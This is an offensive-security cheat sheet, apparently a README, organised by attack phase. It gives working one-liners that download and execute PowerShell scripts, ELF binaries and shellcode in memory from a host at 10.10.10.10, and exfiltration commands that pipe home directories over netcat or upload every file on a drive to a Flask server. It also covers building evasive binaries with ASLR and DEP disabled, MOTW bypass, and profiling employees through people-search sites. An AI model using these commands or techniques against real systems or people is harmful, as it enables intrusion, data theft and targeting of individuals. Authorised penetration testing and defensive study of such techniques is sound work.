# Offensive Security Notes: Unredacted  
**Be advised: hot takes ahead. These are the things people don’t say out loud.**

- [OSINT](#osint)  
- [External Recon](#external-recon)  
- [Resource Development](#resource-development)  
- [Initial Access](#initial-access)  
- [Execution](#execution)  
- [Defense Evasion](#defense-evasion)  
- [Command & Control](#command--control)  
- [Credential Access](#credential-access)  
- [Lateral Movement](#lateral-movement)  
- [Privilege Escalation](#privilege-escalation)  
- [Exfiltration](#exfiltration)  

---

## OSINT

<table>
  <tr><td>LinkedIn</td><td>Can Filter by company and it shows employees, also even shows people based on type of degree (allows you to profile targets) - Can use VPN and dummy account</td></tr>
  <tr><td>Employee Collection</td><td>Most companies use gmail and outlook. Also most employee emails are first.lastname@domain.com,firstname@domain.com, or <lastname><first_initial><second_initial>@domain.com. Even if you get preferred names from LinkedIn you can use sites like TruePeopleSearch to get full names, phone numbers, and addresses. You can also use IDCrawl to find social media accounts.</td></tr>
  <tr><td>Targeting</td><td>Can build a mind map on individuals, including prioritization of targeting. I’ll figure out how to word what I want here. Most of it doesn't apply to "red team" since there is no real hacking. It apply to actual technqiues to exploit individuals.</td></tr>
</table>

---

## External Recon

<table>
  <tr>
    <td>Protocol Recon via Packet Grep</td>
    <td>
      <pre><code>sudo ngrep -i -d &lt;network interface&gt; 's.?a.?m.?b.?a.*[[:digit:]]' port 139
smbclient -U '%' -N -L \\\\10.10.10.10\\</code></pre>
    </td>
  </tr>
  <tr>
    <td>Using Shodan to Retrieve Open Ports and Info</td>
    <td>
      <pre><code>nmap -sn -Pn -n --script=shodan-api --script-args 'shodan-api.apikey=XXXXXX' worldsworstwebsiteever.com</code></pre>
    </td>
  </tr>
  <tr>
    <td>Firewall Evasion</td>
    <td>
      <a href="https://github.com/kritikakatyal/Firewall-Evasion-Techniques-Analysis" target="_blank">Firewall Evasion Techniques</a>
    </td>
  </tr>
</table>

## Resource Development

<table>
  <tr>
    <td><b>Compile C++ with cl.exe</b></td>
    <td>
      <pre><code>cl.exe /nologo /MT /Ox /W0 /GS- /EHs- /GR- /DNDEBUG /Tp bubble_sort.cpp /link kernel32.lib /DYNAMICBASE:NO /NXCOMPAT:NO /OUT:bubble_sort.exe /SUBSYSTEM:WINDOWS /MACHINE:x64 /ENTRY:WinMain /NODEFAULTLIB /MERGE:.rdata=.text /MERGE:.pdata=.text /MERGE:.data=.text /HEAP:0x100000,0x100000</code></pre>
      <p><b>Flag Breakdown:</b></p>
      <ul>
        <li><code>/nologo</code>: Suppresses the compiler startup banner for cleaner output.</li>
        <li><code>/MT</code>: Statically links the multithreaded C runtime (avoids dependency on external CRT DLLs).</li>
        <li><code>/Ox</code>: Enables full optimization for speed and size.</li>
        <li><code>/W0</code>: Disables all compiler warnings.</li>
        <li><code>/GS-</code>: Disables buffer security checks (removes stack canaries).</li>
        <li><code>/EHs-</code>: Disables C++ exception handling.</li>
        <li><code>/GR-</code>: Disables RTTI (Run-Time Type Information), useful for size reduction.</li>
        <li><code>/DNDEBUG</code>: Defines NDEBUG to disable debug assertions.</li>
        <li><code>/Tp</code>: Compile C++ source.</li>
        <li><code>/Tc</code>: Compile C source.</li>
        <li><code>/NODEFAULTLIB</code>: Prevents linking against default libraries.</li>
        <li><code>/MERGE:.rdata=.text /MERGE:.pdata=.text /MERGE:.data=.text</code>: Merges read-only, exception, and data segments into the executable code segment to simplify memory layout and reduce footprint.</li>
        <li><code>/HEAP:0x100000,0x100000</code>: Sets both initial and maximum crt heap size to 1MB.</li>
        <li><code>/DYNAMICBASE:NO</code> and <code>/NXCOMPAT:NO</code>: Disables ASLR and DEP.</li>
        <li><code>/ENTRY:WinMain</code>: Sets the entry point to the Windows GUI application function.</li>
        <li><code>/SUBSYSTEM:WINDOWS</code>: Specifies the Windows GUI subsystem (instead of console).</li>
        <li><code>/MACHINE:x64</code>: Target 64-bit architecture.</li>
      </ul>
    </td>
  </tr>
  <tr>
    <td><b>Compile assembly with MASM</b></td>
    <td>
      <pre><code>ml64 /c syscalls.asm /Fo syscalls.obj</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Compile C# with csc.exe</b></td>
    <td>
      <pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /optimize+ /debug- .\data_recovery.cs</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Compile C# with Roslyn Compiler</b></td>
    <td>
      <pre><code>& "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\Roslyn\csc.exe" /optimize+ /unsafe /debug- .\program.cs .\Structs.cs</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Publish .NET Application</b></td>
    <td>
      <pre><code>dotnet publish -c Release -r win-x64 --self-contained /p:PublishSingleFile=true /p:PublishTrimmed=true /p:EnableCompressionInSingleFile=true</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Convert COM Type Library to .NET Assembly</b></td>
    <td>
      <pre><code>tlbimp C:\Windows\System32\wsmauto.dll /out:WSManAutomation.dll</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Add Reference to .NET Project</b></td>
    <td>
      <pre><code>dotnet add reference WSManAutomation.dll</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>FreeBSD Cross-Compile with Clang</b></td>
    <td>
      <pre><code>clang --target=x86_64-unknown-freebsd12.2 --sysroot=/root/cross_compiler/freebsd-12.2-sysroot -I/root/cross_compiler/freebsd-12.2-sysroot/usr/include -L/root/cross_compiler/freebsd-12.2-sysroot/usr/lib -o shell shell.c -fPIC</code></pre>
    </td>
  </tr>
</table>



## Initial Access

<table>
    <tr>
    <td>Phishing/Smishing</td>
    <td>
      <a href="https://medium.com/sud0root/mastering-modern-red-teaming-infrastructure-part-7-advanced-phishing-techniques-for-2fa-bypass-85f9adc4dc3b" target="_blank">Medium: Advanced Phishing Techniques for 2FA Bypass</a>,  
      MFA becoming more popular and companies usually only give higher-ups phones. This means most employees use their personal phones.
    </td>
    </tr>
  <tr><td>MOTW bypass</td><td>tar.gz bypasses motw and can be extraced with 7-zip. CrowdStrike flags on using tar from windows due to lolbin</td></tr>
  <tr>
    <td>Excel</td>
    <td>
      <a href="https://github.com/mttaggart/xllrs" target="_blank"> Rust XLL</a>
      Microsoft blocks macros in documents originating from the internet (email AND web download), XLL (Excel Add-Ins) are dlls loaded by Excel. Still get warning for no signature. Need legitimate code signing certificate to avoid this.
    </td>
    </tr>
    <tr>
    <td>Supply Chain</td>
    <td>
      <a href="https://github.com/0x-Apollyon/Malicious-VScode-Extension" target="_blank">VS Code Plugin </a>
      I have seen many developers trust and install plugins that come from the Visual Studio code marketplace. <a href="https://www.bleepingcomputer.com/news/security/malicious-vscode-extensions-with-millions-of-installs-discovered/" target="_blank"></a>
    </td>
    </tr>
    <tr>
    <td>WAF</td>
    <td>
      <a href="https://github.com/botesjuan/Obfuscating-Techniques-WAF-Bypass" target="_blank">Obfuscation Tricks</a>
    </td>
    </tr>
  <tr>
    <td>Routers</td>
    <td>
      Will fill in, but popping these is how nation-states get in.
    </td>
    </tr>
    <tr>
  <td><b>Insecure Deserialization</b></td>
  <td>
    <a href="https://www.youtube.com/watch?v=t-zVC-CxYjw" target="_blank">Insecure Deserialization Explained</a><br>
  </td>
</tr>

</table>

---

## Execution

<table>
  <tr>
    <td><b>PowerUp in Memory (CMD)</b></td>
    <td>
      <pre><code>echo IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/PowerUp.ps1') | powershell -noprofile -</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>PowerUp in Memory (PowerShell)</b></td>
    <td>
      <pre><code>wget('http://10.10.10.10/PowerUp.ps1') -UseBasicParsing | iex</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Python3 ELF In-Memory (No Params)</b></td>
    <td>
      <pre><code>python3.7 -c 'import os, urllib.request; d=urllib.request.urlopen("http://10.10.0.103/test.exe"); fd=os.memfd_create("foo"); os.write(fd,d.read()); p=f"/proc/self/fd/{fd}"; os.execve(p, [p], {})'</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Python3 ELF In-Memory (With Params)</b></td>
    <td>
      <pre><code>python3 -c 'import os; import urllib.request; d = urllib.request.urlopen("https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true"); fd = os.memfd_create("foo"); os.write(fd, d.read()); p = f"/proc/self/fd/{fd}"; os.execve(p, [p,"-Pn", "-n", "127.0.0.1"], {})'</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Python2 Shellcode Execution</b></td>
    <td>
      <pre><code>/usr/bin/python -c 'import urllib2,mmap,ctypes;d=urllib2.urlopen("http://10.10.10.10/a").read();m=mmap.mmap(-1,len(d),34,7);m.write(d);ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_char.from_buffer(m)))()'</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Python2 Temp ELF Execution</b></td>
    <td>
      <pre><code>/usr/bin/python -c 'import os,urllib2,tempfile;d=urllib2.urlopen("http://10.10.10.10/config").read();f=tempfile.NamedTemporaryFile(delete=False);f.write(d);f.close();os.chmod(f.name,0755);os.execve(f.name,[f.name,"-pthread"],{})'</code></pre>
    </td>
  </tr>
</table>


## Command & Control

<table>
  <tr><td><b>Subcategory</b></td><td><b>Description / Notes</b></td></tr>
  <tr><td>Beacon Profiles</td><td>Low-and-slow configs, jitter tuning, domain fronting tricks</td></tr>
  <tr><td>Frameworks & Custom Tooling</td><td>Cobalt Strike, Sliver, custom implants, OPSEC-safe builds</td></tr>
  <tr><td>Infrastructure Setup</td><td>Redirectors, staging servers, domain blending, TLS fingerprinting</td></tr>
</table>

---

## Credential Access

<table>
  <tr><td><b>Subcategory</b></td><td><b>Description / Notes</b></td></tr>
  <tr><td>Password Dumping</td><td>LSASS scraping, memory inspection, offline SAM parsing</td></tr>
  <tr><td>Token Theft / Abuse</td><td>Impersonation, delegation tokens, S4U abuse, golden tickets</td></tr>
  <tr><td>MFA / SSO Bypass</td><td>Push fatigue, token replay, OAuth abuse, conditional access gaps</td></tr>
</table>

---

## Lateral Movement

<table>
  <tr><td><b>Subcategory</b></td><td><b>Description / Notes</b></td></tr>
  <tr><td>Remote Execution</td><td>WMI, PSRemoting, scheduled tasks, service creation</td></tr>
  <tr><td>Credential Reuse</td><td>Pass-the-Hash, Pass-the-Ticket, Kerberoasting, plaintext creds</td></tr>
  <tr><td>AD / Identity Abuse</td><td>ACL abuse, shadow admin paths, group membership manipulation</td></tr>
</table>

---

## Privilege Escalation

<table>
  <tr><td><b>Subcategory</b></td><td><b>Description / Notes</b></td></tr>
  <tr><td>Local Exploits</td><td>Kernel bugs, DLL hijacking, vulnerable drivers, CVE chaining</td></tr>
  <tr><td>Misconfigurations</td><td>Unquoted service paths, writable directories, insecure permissions</td></tr>
  <tr><td>Token / Role Abuse</td><td>Privileged token impersonation, cloud role escalation, SID history tricks</td></tr>
</table>

---

<table>
  <tr>
    <td><b>Exfil via Embedded Linux</b></td>
    <td>
      <pre><code>nc -l -p 1234 | tar xf -
tar cf - /home/debian | nc 10.10.10.10 1234</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Exfil via SMB</b></td>
    <td>
      <pre><code>smbclient \\\\10.10.10.10\\share -p &lt;Port&gt; -N -Tc share.tar
tar xf share.tar -C share</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Exfil via PowerShell to Flask Upload Server</b></td>
    <td>
      <pre><code>$files = Get-ChildItem -Path "S:\" -Recurse -File
foreach ($file in $files) {
    $body = [System.IO.File]::ReadAllBytes($file.FullName)
    Invoke-WebRequest -Uri "http://10.10.10.10/upload" -Method POST -Body $body -Headers @{"Filename" = $file.Name}
}</code></pre>
      <p><i>Linux box run:</i></p>
      <pre><code>pip3 install flask</code></pre>
      <pre><code># upload_server.py
from flask import Flask, request
app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload():
    f = request.files['file']
    f.save(f.filename)
    return 'File uploaded successfully'

app.run(host='0.0.0.0', port=80)</code></pre>
      <p><i>Run with:</i><br><code>sudo python3 upload_server.py</code></p>
    </td>
  </tr>
</table>
